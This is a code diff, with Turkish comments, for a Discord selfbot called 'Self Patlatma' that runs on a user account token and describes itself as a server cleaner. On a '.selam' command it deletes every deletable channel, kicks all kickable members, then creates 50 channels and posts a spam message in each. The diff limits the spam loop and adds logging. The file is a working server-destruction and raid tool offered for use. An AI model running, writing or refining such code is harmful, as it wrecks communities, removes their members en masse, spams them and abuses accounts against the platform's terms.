@@ -9,6 +9,15 @@
 const { Client, GatewayIntentBits } = require('discord.js-selfbot-v13');
 const readline = require('readline');
 
+// Sadece kare çerçeve
+const FRAME_ART = `
+╔══════════════════════════════════════════════════════════════════════════════════╗
+║                        SELF PATLATMA v1.0 - DISCORD CLEANER                     ║
+║                              Created by: Henzy                                   ║
+║                           GitHub: https://github.com/Henzy98                    ║
+╚══════════════════════════════════════════════════════════════════════════════════╝
+`;
+
 class DiscordSelfPatlatma {
     constructor() {
         this.client = new Client({
@@ -17,11 +26,14 @@ class DiscordSelfPatlatma {
             ws: { properties: { browser: 'Discord Client' } }
         });
         
+        this.config = null;
         this.setupEventHandlers();
     }
 
     setupEventHandlers() {
         this.client.on('ready', () => {
+            console.clear();
+            console.log(FRAME_ART);
             console.log('╔══════════════════════════════════════════════════════════════════════════════════╗');
             console.log('║                           Henzy Self Patlatma                                 ║');
             console.log('║                       Discord Server Cleaner Tool                             ║');
@@ -40,13 +52,32 @@ class DiscordSelfPatlatma {
         });
 
         this.client.on('messageCreate', async (message) => {
-            if (message.author.id !== this.client.user.id) return;
-            if (!message.content.startsWith('.')) return;
+            // Bot kendi mesajlarını okumasın
+            if (message.author.id === this.client.user.id) {
+                return;
+            }
+            
+            // Sadece belirtilen USER_ID'den gelen mesajları işle
+            if (message.author.id !== this.config.USER_ID) {
+                return; // Hiç loglama, sessizce atla
+            }
+            
+            console.log(`🔍 Mesaj alındı: ${message.content} (${message.author.tag})`);
+            
+            // Prefix kontrolü
+            if (!message.content.startsWith('.')) {
+                console.log('❌ Prefix yok, atlanıyor');
+                return;
+            }
             
             const command = message.content.toLowerCase();
+            console.log(`🎯 Komut algılandı: ${command}`);
             
             if (command === '.selam') {
+                console.log('✅ .selam komutu çalıştırılıyor...');
                 await this.handleSelamCommand(message);
+            } else {
+                console.log(`❌ Bilinmeyen komut: ${command}`);
             }
         });
     }
@@ -66,6 +97,10 @@ class DiscordSelfPatlatma {
     }
 
     async getConfigFromUser() {
+        // Kare çerçeveyi göster
+        console.clear();
+        console.log(FRAME_ART);
+        
         console.log('🚀 Discord Self Patlatma (Kullanıcı Hesabı) başlatılıyor...');
         console.log('⚠️  UYARI: Self-token kullanımı Discord ToS\'a aykırıdır!');
         console.log('⚠️  Hesap banlanması riski vardır!');
@@ -78,7 +113,7 @@ class DiscordSelfPatlatma {
         console.log('');
         
         const token = await this.askQuestion('🔑 Discord self-token\'ınızı girin: ');
-        const userId = await this.askQuestion('👤 Discord kullanıcı ID\'nizi girin: ');
+        const userId = await this.askQuestion('👤 Discord kullanıcı ID\'nizi girin (komutları kullanacak hesabın ID\'si): ');
         const channelName = await this.askQuestion('📝 Oluşturulacak kanal adını girin: ');
         const messageContent = await this.askQuestion('💬 Spam mesajını girin: ');
         
@@ -97,75 +132,100 @@ class DiscordSelfPatlatma {
     }
 
     async handleSelamCommand(message) {
-        if (!message.guild) {
-            message.reply('❌ Bu komut sadece sunucularda kullanılabilir!');
-            return;
-        }
-
-        const config = await this.getConfigFromUser();
-        
-        if (message.author.id !== config.USER_ID) {
-            message.reply('❌ Bu komutu sadece yetkili kullanıcı kullanabilir!');
-            return;
-        }
-
         try {
-            console.log(`🎯 ${message.guild.name} sunucusu temizleniyor...`);
+            console.log('🔍 Mesaj gönderen ID:', message.author.id);
+            console.log('🔍 Beklenen ID:', this.config.USER_ID);
+            console.log('🔍 ID\'ler eşleşiyor mu:', message.author.id === this.config.USER_ID);
             
-            await this.cleanServer(message.guild, config);
+            if (message.author.id !== this.config.USER_ID) {
+                await message.reply(`❌ Bu komutu sadece yetkili kullanıcı kullanabilir!\nGönderen ID: ${message.author.id}\nBeklenen ID: ${this.config.USER_ID}`);
+                return;
+            }
+
+            const guild = message.guild;
+            if (!guild) {
+                await message.reply('❌ Bu komut sadece sunucularda kullanılabilir!');
+                return;
+            }
+
+            console.log(`🎯 ${guild.name} sunucusu temizleniyor...`);
             
-            console.log('✅ Sunucu temizleme tamamlandı!');
-            message.reply('✅ Sunucu temizleme tamamlandı!');
+            try {
+                await message.reply('🚀 Sunucu temizleme başlatılıyor... Bu işlem geri alınamaz!');
+            } catch {}
+
+            // 1. TÜM KANALLARI TEK SEFERDE SİL
+            const channels = guild.channels.cache;
+            console.log(`🗑️ ${guild.name} sunucusunda ${channels.size} kanal bulundu`);
+            
+            const deletableChannels = channels.filter(channel => channel.deletable);
+            console.log(`🚀 ${deletableChannels.size} kanal aynı anda siliniyor...`);
+            
+            // Tüm kanalları paralel olarak sil
+            const deletePromises = deletableChannels.map(channel => 
+                channel.delete().catch(err => {
+                    console.log(`❌ Kanal silinemedi: ${channel.name} - ${err.message}`);
+                    return false;
+                })
+            );
+            
+            await Promise.all(deletePromises);
+            console.log(`✅ ${deletableChannels.size} kanal silme işlemi tamamlandı!`);
+
+            // 2. TÜM ÜYELERİ TEK SEFERDE AT
+            const members = guild.members.cache.filter(member => 
+                member.kickable && !member.user.bot && member.id !== guild.ownerId
+            );
+            
+            console.log(`👥 ${members.size} üye aynı anda atılıyor...`);
+            
+            // Tüm üyeleri paralel olarak at
+            const kickPromises = members.map(member => 
+                member.kick('Sunucu temizleniyor').catch(err => {
+                    console.log(`❌ Üye atılamadı: ${member.user.tag} - ${err.message}`);
+                    return false;
+                })
+            );
+            
+            await Promise.all(kickPromises);
+            console.log(`✅ ${members.size} üye atma işlemi tamamlandı!`);
+
+            // 3. SPAM KANALLARINI OLUŞTUR
+            console.log('🚀 Spam kanalları oluşturuluyor...');
+            
+            for (let i = 1; i <= 50; i++) {
+                try {
+                    const channelName = `${this.config.CHANNEL_NAME}-${i}`;
+                    const newChannel = await guild.channels.create(channelName, {
+                        type: 0, // Text channel
+                        reason: 'Spam kanalı'
+                    });
+                    
+                    console.log(`✅ Kanal oluşturuldu: ${channelName}`);
+                    
+                    // Spam mesajını gönder
+                    try {
+                        await newChannel.send(this.config.MESSAGE_CONTENT);
+                        console.log(`📨 Mesaj gönderildi: ${channelName}`);
+                    } catch (err) {
+                        console.log(`❌ Mesaj gönderilemedi: ${channelName} - ${err.message}`);
+                    }
+                    
+                    // Hızlı spam için kısa bekleme
+                    await this.sleep(100);
+                    
+                } catch (err) {
+                    console.log(`❌ Kanal oluşturulamadı: ${i} - ${err.message}`);
+                }
+            }
+            
+            console.log('🎉 Sunucu patlatma tamamlandı!');
             
         } catch (error) {
-            console.error('❌ Sunucu temizleme hatası:', error);
-            message.reply('❌ Sunucu temizleme sırasında hata oluştu!');
-        }
-    }
-
-    async cleanServer(guild, config) {
-        const channels = guild.channels.cache.filter(ch => ch.type === 0);
-        const roles = guild.roles.cache.filter(r => r.name !== '@everyone' && r.position < guild.me.roles.highest.position);
-        const members = guild.members.cache.filter(m => !m.permissions.has('Administrator') && m.id !== guild.ownerId);
-
-        console.log(`🗑️  ${channels.size} kanal siliniyor...`);
-        await Promise.all(channels.map(ch => ch.delete().catch(() => {})));
-
-        console.log(`👥 ${members.size} üye atılıyor...`);
-        await Promise.all(members.map(m => m.kick().catch(() => {})));
-
-        console.log(`🏷️  ${roles.size} rol siliniyor...`);
-        await Promise.all(roles.map(r => r.delete().catch(() => {})));
-
-        console.log('🚀 Spam kanalları oluşturuluyor...');
-        await this.createSpamChannels(guild, config);
-    }
-
-    async createSpamChannels(guild, config) {
-        let channelCount = 0;
-        
-        const createAndSpam = async () => {
+            console.error('❌ Sunucu temizleme hatası:', error.message);
             try {
-                const newChannel = await guild.channels.create({
-                    name: config.CHANNEL_NAME,
-                    type: 0
-                });
-                
-                channelCount++;
-                console.log(`📝 Kanal oluşturuldu: ${newChannel.name} (${channelCount})`);
-                
-                await newChannel.send(config.MESSAGE_CONTENT);
-                await this.sleep(200);
-                
-            } catch (error) {
-                console.error('❌ Kanal oluşturulamadı:', error);
-                await this.sleep(1000);
-            }
-        };
-
-        while (true) {
-            await createAndSpam();
-            await this.sleep(config.DELAY);
+                await message.reply(`❌ Hata oluştu: ${error.message}`);
+            } catch {}
         }
     }
 
@@ -175,27 +235,17 @@ class DiscordSelfPatlatma {
 
     async start() {
         try {
-            const config = await this.getConfigFromUser();
-            this.config = config;
+            console.log('🔄 Konfigürasyon alınıyor...');
+            this.config = await this.getConfigFromUser();
             
-            console.log(`🔒 Sadece ${config.USER_ID} ID'li kullanıcı komutları kullanabilir!`);
-            console.log('');
+            console.log('🔗 Discord client başlatılıyor...');
+            await this.client.login(this.config.DISCORD_TOKEN);
             
-            await this.client.login(config.DISCORD_TOKEN);
-            
+            console.log('✅ Discord bağlantısı başarılı!');
         } catch (error) {
-            console.error('❌ Başlatma hatası:', error);
-            console.log('⏳ Çıkmak için herhangi bir tuşa basın...');
-            
-            const rl = readline.createInterface({
-                input: process.stdin,
-                output: process.stdout
-            });
-            
-            rl.question('', () => {
-                rl.close();
-                process.exit(1);
-            });
+            console.error('❌ Hata oluştu:', error.message);
+            console.log('🔍 Hata detayları:', error);
+            process.exit(1);
         }
     }
 }
